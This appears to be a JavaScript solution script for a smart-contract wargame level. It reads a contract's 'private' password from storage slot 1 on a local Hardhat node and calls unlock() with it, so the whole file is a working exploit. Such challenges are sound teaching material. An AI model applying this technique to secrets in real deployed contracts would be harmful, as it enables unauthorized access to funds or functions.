const { ethers } = require("hardhat");
require("dotenv").config();
const CONTRACT_ADDRESS = "0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

const SLOT_INDEX = 1;

async function main() {
  // Create a JsonRpcProvider instance that connects to the local network
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );

  //   Create a wallet instance (for signing transactions)

  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  // Read the value of the "locked" variable (slot 1)
  const value = await provider.getStorageAt(CONTRACT_ADDRESS, SLOT_INDEX);
  console.log(`Value of "locked" variable: ${value}`);
  // Convert the value from bytes32 to string
  const hexValue = ethers.utils.hexlify(value);
  const stringValue = ethers.utils.toUtf8String(hexValue);
  console.log(`Value of "locked" variable: ${stringValue}`);

  const contractInterface = [
    "function unlock(bytes32 _password) public",
    "function locked() public view returns (bool)",
  ];
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    wallet
  );
  // Call the unlock function
  const unlockTx = await contract.unlock(value);
  console.log(`Unlock transaction hash: ${unlockTx.hash}`);
  // Check the locked state after calling the unlock function
  const locked = await contract.locked();
  console.log(`Locked state after unlock: ${locked}`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
